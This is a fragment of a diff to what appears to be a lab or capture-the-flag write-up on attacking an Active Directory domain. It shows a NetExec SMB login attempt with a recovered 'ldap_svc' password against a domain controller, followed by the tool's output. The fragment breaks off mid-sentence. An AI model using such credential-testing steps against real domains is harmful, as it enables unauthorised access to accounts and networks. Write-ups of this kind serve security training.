@@ -557,3 +557,9 @@ The CA service account is not as important here since its already compromised
 
 But the `ldap_svc` account is a nice finding
 
+```python
+nxc smb dc.ext.darkhaven.local -u 'ldap_svc' -p '6trfgvb**hs#@jskKFHJAh34' --smb-timeout 30
+SMB         10.10.10.136    445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
+SMB         10.10.10.136    445    DC               [-] ext.darkhaven.local\ldap_svc:6trfgvb**hs#@jskKFHJAh34 STATUS_ACCOUNT_RESTRICTION
+```
+So if i set a timeout
